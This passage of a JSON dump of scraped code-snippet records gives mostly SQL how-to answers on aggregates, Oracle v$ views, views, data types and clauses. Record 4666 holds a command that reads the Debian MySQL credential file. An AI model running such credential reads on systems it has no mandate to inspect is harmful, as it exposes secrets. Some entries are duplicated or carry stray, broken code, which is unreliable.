    "keyword": null,
    "link": null,
    "title": " using sum function in mysql for two diffrenet conditions",
    "description": "                                     SELECT      SUM(CASE         WHEN status = 'Shipped' THEN quantityOrdered     END) qty_shipped,     SUM(CASE         WHEN status = 'Resolved' THEN quantityOrdered     END) qty_resolved,     SUM(CASE         WHEN status = 'Cancelled' THEN quantityOrdered     END) qty_cancelled,     SUM(CASE         WHEN status = 'On Hold' THEN quantityOrdered     END) qty_on_hold,     SUM(CASE         WHEN status = 'Disputed' THEN quantityOrdered     END) qty_on_disputed,     SUM(CASE         WHEN status = 'In Process' THEN quantityOrdered     END) qty_in_process FROM     orderdetails         INNER JOIN     orders USING (orderNumber); \nSELECT sum( mark ) FROM `student`\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4629,
    "keyword": null,
    "link": null,
    "title": " uuid sqlalcomany",
    "description": "def generate_uuid():     return str(uuid.uuid4())  class MyTable(Base):     __tablename__ = 'my_table'      uuid = Column(String, name=\"uuid\", primary_key=True, default=generate_uuid) \n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4630,
    "keyword": null,
    "link": null,
    "title": " v$db pipes",
    "description": "SELECT ownerid, name, type, pipe_size FROM   v$db_pipes ORDER BY 1,2;\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4631,
    "keyword": null,
    "link": null,
    "title": " v$parameter",
    "description": "GRANT SELECT_CATALOG_ROLE TO my_user;\t-- to read V$PARAMETER   SELECT NAME, VALUE, DESCRIPTION FROM V$PARAMETER  --WHERE upper(NAME) = 'NLS_DATE_FORMAT'  ORDER BY NAME;  ALTER SESSION SET  \tNLS_LANGUAGE='AMERICAN'      NLS_TERRITORY='AMERICA'      NLS_CALENDAR='GREGORIAN'     NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4632,
    "keyword": null,
    "link": null,
    "title": " v$session not found in oracle",
    "description": "GRANT SELECT ON V$SESSION TO my_user;\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4633,
    "keyword": null,
    "link": null,
    "title": " v$session table or view does not exist",
    "description": "GRANT SELECT ON V$SESSION TO my_user;\n",
    "reg_date": "2021-10-12T10:01:27.000Z"
  },
  {
    "id": 4634,
    "keyword": null,
    "link": null,
    "title": " v$transaction, v$session",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4635,
    "keyword": null,
    "link": null,
    "title": " v$transaction",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4636,
    "keyword": null,
    "link": null,
    "title": " v$transaction 12c",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4637,
    "keyword": null,
    "link": null,
    "title": " v$transaction 19c",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4638,
    "keyword": null,
    "link": null,
    "title": " var in sql",
    "description": "-- Declare the variable to be used. DECLARE @MyCounter int;  -- Initialize the variable. SET @MyCounter = 0;\nDECLARE @COURSE_ID AS INT, @COURSE_NAME VARCHAR (10); \nOne way of doing this is to use database variables  create table testcalc (    id int(11) not null auto_increment,    num1 int(11) default null,    num2 int(11) default null,    num3 int(11) default null,    num4 int(11) default null,    primary key(id) );  insert into testcalc values (default, 1, 2, 3, 4), (default, 5, 10, 15, 20); Then you can get the same results as in your example by storing the calculation results in variable syntax like this  @youVar := (calc) as resultName01 Then it will be available to following calculations to use like this  (@youVar + newCalc) as resultName02 We can apply it to your example like this  select    id,    num1,    num2,    num3,    num4,    @1plus2 := (num1 + num2) as 1plus2,                   # create var01    @1plus2mult3 := (@1plus2 * num3) as 1plus2mult3,      # create var02 using var01    @sumOfCalc := (@1plus2 + @1plus2mult3) as sumOfCalc   # create var03 using var01 and var02 from testcalc;\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4639,
    "keyword": null,
    "link": null,
    "title": " variable 'sql mode' can't be set to the value of 'no auto create user'",
    "description": "mysql> SELECT @@sql_mode; \n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4640,
    "keyword": null,
    "link": null,
    "title": " variables in select statement in sql server",
    "description": "USE AdventureWorks2014; GO DECLARE @MyVariable int; SET @MyVariable = 1; -- Terminate the batch by using the GO keyword. GO  -- @MyVariable has gone out of scope and no longer exists.  -- This SELECT statement generates a syntax error because it is -- no longer legal to reference @MyVariable. SELECT BusinessEntityID, NationalIDNumber, JobTitle FROM HumanResources.Employee WHERE BusinessEntityID = @MyVariable; \n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4641,
    "keyword": null,
    "link": null,
    "title": " vbscript connect mssql",
    "description": "Const adLockBatchOptimistic = 4 Const adUseClient = 3   Set iconnTrans = CreateObject(\"ADODB.Connection\")  iconnTrans.open _ \t\"Provider=SQLOLEDB.1;Data Source = localhost\\sqlexpress;Integrated Security = SSPI;Initial Catalog=dw2\"  Set rsTrans = CreateObject(\"ADODB.Recordset\")  rsTrans.CursorLocation = adUseClient rsTrans.LockType = adLockBatchOptimistic rsTrans.open \"SELECT * FROM ir_Transactions\", iconnTrans\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4642,
    "keyword": null,
    "link": null,
    "title": " vbscript for each loop",
    "description": "For Each item In items    ...    If exitNow = True Then       Exit For    End If Next\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4643,
    "keyword": null,
    "link": null,
    "title": " ver usuarios mysql",
    "description": "mysql> SELECT user FROM mysql.user;\n",
    "reg_date": "2021-10-12T10:01:28.000Z"
  },
  {
    "id": 4644,
    "keyword": null,
    "link": null,
    "title": " view and kill postgresql connections to database",
    "description": "/* view connections */ SELECT * FROM pg_stat_activity;  /*-&mdash; Kill connections*/ SELECT     pg_terminate_backend(pid) FROM     pg_stat_activity WHERE     -- don't kill my own connection!     pid != pg_backend_pid()     -- don't kill the connections to other databases     AND datname = 'clinical_data';  /* kill a specific connection */      select pg_terminate_backend(13337)\n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4645,
    "keyword": null,
    "link": null,
    "title": " view detailed table schema postgresql",
    "description": "-- All information SELECT * FROM information_schema.columns WHERE table_schema = 'some_schema' AND TABLE_NAME = 'some_table';  -- Or a more simplified version  SELECT    table_name,    column_name,    data_type FROM    information_schema.columns WHERE    table_name = 'some_table'; \n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4646,
    "keyword": null,
    "link": null,
    "title": " view in sql server",
    "description": "/* A view is created with the CREATE VIEW statement. */ CREATE VIEW view_name AS SELECT column1, column2, ... FROM table_name WHERE condition;  /*example*/ CREATE VIEW [Brazil Customers] AS SELECT CustomerName, ContactName FROM Customers WHERE Country = 'Brazil'; /*query*/ SELECT * FROM [Brazil Customers];\n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4647,
    "keyword": null,
    "link": null,
    "title": " view t-sql mail configuration",
    "description": "EXEC msdb.dbo.sysmail_help_configure_sp; EXEC msdb.dbo.sysmail_help_account_sp; EXEC msdb.dbo.sysmail_help_profile_sp; EXEC msdb.dbo.sysmail_help_profileaccount_sp; EXEC msdb.dbo.sysmail_help_principalprofile_sp;\n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4648,
    "keyword": null,
    "link": null,
    "title": " views in sql",
    "description": "Views are created in order to store your queries as virtual table. If there are a lot of columns and we don&rsquo;t want to use all columns and make the table simpler, we can create a view and reuse it repeatedly. Actually, view does not store any data however, it contains the retrieve statements to provide reusability. We can create view if we use some queries mostly. create view EmployeeInfo as select first_name || last_name as \"Full Name\" from employees; \nCREATE VIEW view_name AS SELECT id,category,MAX(created_at),content,title FROM table WHERE condition GROUP BY category\nCREATE VIEW view_name AS SELECT column1, column2..... FROM table_name WHERE condition;  view_name: Name for the View table_name: Name of the table condition: Condition to select rows \n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4649,
    "keyword": null,
    "link": null,
    "title": " w3schools create table",
    "description": "CREATE TABLE table_name (     column1 datatype,     column2 datatype,     column3 datatype,    .... ); \n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4650,
    "keyword": null,
    "link": null,
    "title": " wait delay in sql server",
    "description": "--The format is hh:mi:ss.mmm. WAITFOR DELAY '00:00:02';\n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4651,
    "keyword": null,
    "link": null,
    "title": " weekday snowflake in number",
    "description": "YEAR( <date_or_timestamp_expr> )  YEAROFWEEK( <date_or_timestamp_expr> ) YEAROFWEEKISO( <date_or_timestamp_expr> )  DAY( <date_or_timestamp_expr> )  DAYOFMONTH( <date_or_timestamp_expr> ) DAYOFWEEK( <date_or_timestamp_expr> ) DAYOFWEEKISO( <date_or_timestamp_expr> ) DAYOFYEAR( <date_or_timestamp_expr> )  WEEK( <date_or_timestamp_expr> )  WEEKOFYEAR( <date_or_timestamp_expr> ) WEEKISO( <date_or_timestamp_expr> )  MONTH( <date_or_timestamp_expr> )  QUARTER( <date_or_timestamp_expr> ) \n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4652,
    "keyword": null,
    "link": null,
    "title": " what are all the different types of indexes in sql",
    "description": "\"There are two types of Indexes in SQL Server  1.\tClustered Index  A clustered index defines the order in which data  is physically stored in a table. Table data can  be sorted in only way, therefore, there can be only  one clustered index per table. In SQL Server,  the primary key constraint automatically creates a  clustered index on that particular column.  2.\tNon-Clustered Index  A non-clustered index doesn&rsquo;t sort the physical  data inside the table. In fact, a non-clustered  index is stored at one place and table data is  stored in another place. This is similar to a  textbook where the book content is located in o ne place and the index is located in another.  This allows for more than one non-clustered index per table.\" \n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4653,
    "keyword": null,
    "link": null,
    "title": " what are correlated and non correlated subquery",
    "description": "Noncorrelated Subqueries A noncorrelated subquery executes independently of the outer query. The subquery executes first, and then passes its results to the outer query, For example:  => SELECT name, street, city, state FROM addresses WHERE state IN (SELECT state FROM states);  Correlated Subqueries A correlated subquery typically obtains values from its outer query before it executes. When the subquery returns, it passes its results to the outer query.  => SELECT name, street, city, state FROM addresses      WHERE EXISTS (SELECT * FROM states WHERE states.state = addresses.state);\n",
    "reg_date": "2021-10-12T10:01:29.000Z"
  },
  {
    "id": 4654,
    "keyword": null,
    "link": null,
    "title": " what are the data types",
    "description": "&bull; number(num) - whole numbers up to num digits &bull; number(num,num2) - num whole numbers up to num2 decimals &bull; char(num) - fixed length character/string &bull; varchar2(num) - used for varying length data &bull; date - full date &bull; currency - used for prices \nclass Output { public static void main(String args[]) int a = 1; int b = 2; int C; int d; C = ++b; d = a++; C++; b++; ++a; System.out.println(a + \" \" + b + \" \" + c); } } Pick ONE option 324 323 234 \n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4655,
    "keyword": null,
    "link": null,
    "title": " what are the data types in sql",
    "description": "# Numeric Types BIT\tTINYINT SMALLINT INT BIGINT DECIMAL NUMERIC FLOAT REAL  # Date & Time Types DATE TIME DATETIME TIMESTAMP YEAR  # Char & String Types (N) Denotes Unicode Versions CHAR VARCHAR TEXT NCHAR NVARCHAR NTEXT  # Binary Data Types BINARY VARBINARY IMAGE  # Misc CLOB BLOB XML JSON\n&bull; number(num) - whole numbers up to num digits &bull; number(num,num2) - num whole numbers up to num2 decimals &bull; char(num) - fixed length character/string &bull; varchar2(num) - used for varying length data &bull; date - full date &bull; currency - used for prices \n-- Text Data Types: CHAR(size) Fixed length string which can contain letters, numbers and special characters. The size parameter sets the maximum string length, from 0 &ndash; 255 with a default of 1. VARCHAR(size) Variable length string similar to CHAR(), but with a maximum string length range from 0 to 65535. BINARY(size) Similar to CHAR() but stores binary byte strings. VARBINARY(size) Similar to VARCHAR() but for binary byte strings. TINYBLOB Holds Binary Large Objects (BLOBs) with a max length of 255 bytes. TINYTEXT Holds a string with a maximum length of 255 characters. Use VARCHAR() instead, as it&rsquo;s fetched much faster. TEXT(size) Holds a string with a maximum length of 65535 bytes. Again, better to use VARCHAR(). BLOB(size) Holds Binary Large Objects (BLOBs) with a max length of 65535 bytes. MEDIUMTEXT Holds a string with a maximum length of 16,777,215 characters. MEDIUMBLOB Holds Binary Large Objects (BLOBs) with a max length of 16,777,215 bytes. LONGTEXT Holds a string with a maximum length of 4,294,967,295 characters. LONGBLOB Holds Binary Large Objects (BLOBs) with a max length of 4,294,967,295 bytes. ENUM(a, b, c, etc&hellip;) A string object that only has one value, which is chosen from a list of values which you define, up to a maximum of 65535 values. If a value is added which isn&rsquo;t on this list, it&rsquo;s replaced with a blank value instead. Think of ENUM being similar to HTML radio boxes in this regard. CREATE TABLE tshirts (color ENUM(&lsquo;red&rsquo;, &lsquo;green&rsquo;, &lsquo;blue&rsquo;, &lsquo;yellow&rsquo;, &lsquo;purple&rsquo;)); SET(a, b, c, etc&hellip;) A string object that can have 0 or more values, which is chosen from a list of values which you define, up to a maximum of 64 values. Think of SET being similar to HTML checkboxes in this regard.\nSELECT TYPEOF(value);\n-- Numeric Data Types: BIT(size) A bit-value type with a default of 1. The allowed number of bits in a value is set via the size parameter, which can hold values from 1 to 64. TINYINT(size) A very small integer with a signed range of -128 to 127, and an unsigned range of 0 to 255. Here, the size parameter specifies the maximum allowed display width, which is 255. BOOL Essentially a quick way of setting the column to TINYINT with a size of 1. 0 is considered false, whilst 1 is considered true. BOOLEAN Same as BOOL. SMALLINT(size) A small integer with a signed range of -32768 to 32767, and an unsigned range from 0 to 65535. Here, the size parameter specifies the maximum allowed display width, which is 255. MEDIUMINT(size) A medium integer with a signed range of -8388608 to 8388607, and an unsigned range from 0 to 16777215. Here, the size parameter specifies the maximum allowed display width, which is 255. INT(size) A medium integer with a signed range of -2147483648 to 2147483647, and an unsigned range from 0 to 4294967295. Here, the size parameter specifies the maximum allowed display width, which is 255. INTEGER(size) Same as INT. BIGINT(size) A medium integer with a signed range of -9223372036854775808 to 9223372036854775807, and an unsigned range from 0 to 18446744073709551615. Here, the size parameter specifies the maximum allowed display width, which is 255. FLOAT(p) A floating point number value. If the precision (p) parameter is between 0 to 24, then the data type is set to FLOAT(), whilst if its from 25 to 53, the data type is set to DOUBLE(). This behaviour is to make the storage of values more efficient. DOUBLE(size, d) A floating point number value where the total digits are set by the size parameter, and the number of digits after the decimal point is set by the d parameter. DECIMAL(size, d) An exact fixed point number where the total number of digits is set by the size parameters, and the total number of digits after the decimal point is set by the d parameter. For size, the maximum number is 65 and the default is 10, whilst for d, the maximum number is 30 and the default is 10. DEC(size, d) Same as DECIMAL.\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4656,
    "keyword": null,
    "link": null,
    "title": " what does declare do in mysql",
    "description": "-- MySQL  DECLARE variable_name datatype(size) [DEFAULT default_value]; -- Declaring a variable without specifying a default value will result it -- in being a null value. -- Declare is what allows us to create a variable\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4657,
    "keyword": null,
    "link": null,
    "title": " what does declare do in sql",
    "description": "-- MySQL  DECLARE variable_name datatype(size) [DEFAULT default_value]; -- Declaring a variable without specifying a default value will result it -- in being a null value. -- Declare is what allows us to create a variable\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4658,
    "keyword": null,
    "link": null,
    "title": " what does leave do in mysql",
    "description": "-- MySQL  -- Leave statement is used to immediately exit the loop.  [label]: LOOP     ...     -- terminate the loop     IF condition THEN         LEAVE [label];     END IF;     ... END LOOP;  \n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4659,
    "keyword": null,
    "link": null,
    "title": " what if no database schema",
    "description": "DATABASE SCHEMA: is a chart that shows all the tables and how they are related to each other. &bull; If there is no schema: 1. Oracle ===> SELECT table_name FROM user_tables; 2. MySQL ===> show tables;\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4660,
    "keyword": null,
    "link": null,
    "title": " what is a variable?",
    "description": "-- In programing variables exist in 99%(if not all) of programing languages: -- Think of them as little boxes that can store data -- some examples:  -- C#   count = 0;   While true   {     count = count + 1;     print(count);   }    -- Python \tcount = 0 \tWhile True:     \tcount = count + 1         print(count)          -- as you see, both of these programs will output: 1 2 3 4 5 6 7 8 9 ... -- and it will keep counting till you crash the program.  -- (ps I am using sql cause it looks nice and hilights a bunch of stuff) -- Youtube: https://www.youtube.com/channel/UCBDHOr2HKOuMiWUj-Pu-AGA -- Grep: https://www.codegrepper.com/app/profile.php?id=3325\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4661,
    "keyword": null,
    "link": null,
    "title": " what is an aggregate in sql",
    "description": "MAX &ndash; To find the number of the maximum values in the SQL table.  MIN &ndash; Number of the minimum values in the table.  COUNT &ndash; Get the number of count values in the SQL table.  AVG &ndash; Find average values in the SQL table.  SUM &ndash;  Return the summation of all non-null values in the SQL table.\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4662,
    "keyword": null,
    "link": null,
    "title": " what is auto increment in sql",
    "description": "CREATE TABLE Persons (     Personid int NOT NULL AUTO_INCREMENT,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     PRIMARY KEY (Personid) ); INSERT INTO Persons (FirstName,LastName) VALUES ('Lars','Monsen');\nCREATE TABLE table_name (     id INT NOT NULL IDENTITY(1, 1),     name NVARCHAR (100) NULL,     school NVARCHAR (100) NULL,     PRIMARY KEY (ID) );\nAutoincrement keyword allows the user to create a unique number to get generated whenever a new record is inserted into the table. This keyword is usually required  whenever PRIMARY KEY in SQL is used.\n INSERT INTO Persons (Personid,FirstName,LastName)  VALUES (seq_person.nextval,'Lars','Monsen'); \n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4663,
    "keyword": null,
    "link": null,
    "title": " what is between keyword used for",
    "description": "Select * From employees Where salary >= 4000 And salary  <= 6000  We can also use between  Select * From employees Where salary BETWEEN 4000 AND 6000\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4664,
    "keyword": null,
    "link": null,
    "title": " what is database",
    "description": "A database is an organised collection of related data from which you can easily retrieve and use data.\nA database is an organized collection of data,  generally stored and accessed electronically  from a computer system. Where databases are  more complex they are often developed  using formal design and modeling techniques.\n",
    "reg_date": "2021-10-12T10:01:30.000Z"
  },
  {
    "id": 4665,
    "keyword": null,
    "link": null,
    "title": " what is database schema",
    "description": "DATABASE SCHEMA: is a chart that shows all the tables and how they are related to each other. &bull; If there is no schema: 1. Oracle ===> SELECT table_name FROM user_tables; 2. MySQL ===> show tables;\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4666,
    "keyword": null,
    "link": null,
    "title": " what is default mysql database password in linux",
    "description": "$ sudo apt install mysql-server $ sudo cat /etc/mysql/debian.cnf\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4667,
    "keyword": null,
    "link": null,
    "title": " what is delete clause",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4668,
    "keyword": null,
    "link": null,
    "title": " what is delete in sql",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4669,
    "keyword": null,
    "link": null,
    "title": " what is delete truncate",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4670,
    "keyword": null,
    "link": null,
    "title": " what is delimiter in mysql",
    "description": "/*  Delimiters other than the default ; are typically used when defining functions, stored procedures, and triggers wherein you must define multiple statements. You define a different delimiter like $$ which is used to define the end of the entire procedure, but inside it, individual statements are each terminated by ;. That way, when the code is run in the mysql client, the client can tell where the entire procedure ends and execute it as a unit rather than executing the individual statements inside.  Note that the DELIMITER keyword is a function of the command line mysql client (and some other clients) only and not a regular MySQL language feature. It won't work if you tried to pass it through a programming language API to MySQL. Some other clients like PHPMyAdmin have other methods to specify a non-default delimiter.  */  /* Example:*/  DELIMITER $$ /* This is a complete statement, not part of the procedure, so use the custom delimiter $$ */ DROP PROCEDURE my_procedure$$  /* Now start the procedure code */ CREATE PROCEDURE my_procedure () BEGIN       /* Inside the procedure, individual statements terminate with ; */   CREATE TABLE tablea (      col1 INT,      col2 INT   );    INSERT INTO tablea     SELECT * FROM table1;    CREATE TABLE tableb (      col1 INT,      col2 INT   );   INSERT INTO tableb     SELECT * FROM table2;    /* whole procedure ends with the custom delimiter */ END$$  /* Finally, reset the delimiter to the default ; */ DELIMITER ; \n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4671,
    "keyword": null,
    "link": null,
    "title": " what is denormalization in sql",
    "description": "Denormalization is a strategy used  on a previously-normalized database to  increase performance. In computing,  denormalization is the process of trying  to improve the read performance of a database,  at the expense of losing some write performance, by adding redundant copies of data or by grouping data.\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4672,
    "keyword": null,
    "link": null,
    "title": " what is distinct",
    "description": "Distinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4673,
    "keyword": null,
    "link": null,
    "title": " what is distinct in sql",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \nSELECT COUNT (DISTINCT column-name)  FROM table-name\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT Column_name FROM table_name;\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4674,
    "keyword": null,
    "link": null,
    "title": " what is drop in sql",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T10:01:31.000Z"
  },
  {
    "id": 4675,
    "keyword": null,
    "link": null,
    "title": " what is group function in sql",
    "description": "--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4676,
    "keyword": null,
    "link": null,
    "title": " what is having",
    "description": "HAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500;\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4677,
    "keyword": null,
    "link": null,
    "title": " what is having clause",
    "description": "HAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500;\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4678,
    "keyword": null,
    "link": null,
    "title": " what is having clause in sql",
    "description": "Having keyword basically similar to if condition Only returns true conditions  SELECT FIRST_NAME , COUNT(*) FROM EMPLOYEES  GROUP BY FIRST_NAME HAVING COUNT(*) > 1\nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500;\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4679,
    "keyword": null,
    "link": null,
    "title": " what is int in mysql",
    "description": "INT stands for interger, so it is interger values. INT can contain zero, positive and negetive values. INT cannot contain fraction values, only hole numbers are excepted.\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4680,
    "keyword": null,
    "link": null,
    "title": " what is intersect",
    "description": "INTERSECT: BASICALLY INTERSECT COMBINES COMMON ELEMENTS OF BOTH TABLES\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4681,
    "keyword": null,
    "link": null,
    "title": " what is intersect in sql",
    "description": "The SQL INTERSECT clause/operator is used to combine two SELECT statements, but returns rows only from the first SELECT statement  that are identical to a row in the second SELECT statement. This means INTERSECT returns only common rows returned by the two  SELECT statements.\nINTERSECT: BASICALLY INTERSECT COMBINES COMMON ELEMENTS OF BOTH TABLES\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4682,
    "keyword": null,
    "link": null,
    "title": " what is my mysql version",
    "description": "# console mysql --version mysql -V  # sql query SHOW VARIABLES LIKE &lsquo;%version%&rsquo;;\nSHOW VARIABLES LIKE \"%version%\"; +-------------------------+------------------------------------------+ | Variable_name           | Value                                    | +-------------------------+------------------------------------------+ | protocol_version        | 10                                       | | version                 | 5.0.27-standard                          | | version_comment         | MySQL Community Edition - Standard (GPL) | | version_compile_machine | i686                                     | | version_compile_os      | pc-linux-gnu                             | +-------------------------+------------------------------------------+ 5 rows in set (0.04 sec)\nmysql -V\nMysql version mysql -V\nmysqld --version\n",
    "reg_date": "2021-10-12T10:01:32.000Z"
  },
  {
    "id": 4683,
    "keyword": null,
    "link": null,
    "title": " what is mysql hostname",
    "description": "If you're already logged into the command line client try this:  mysql> select user(); It will output something similar to this:  +----------------+ | user()         | +----------------+ | root@localhost | +----------------+ 1 row in set (0.41 sec) In my example above, I was logged in as root from localhost.  To find port number and other interesting settings use this command:  mysql> show variables;\n",
    "reg_date": "2021-10-12T10:01:33.000Z"
  },
  {
    "id": 4684,
    "keyword": null,
    "link": null,
    "title": " what is not operator in sql",
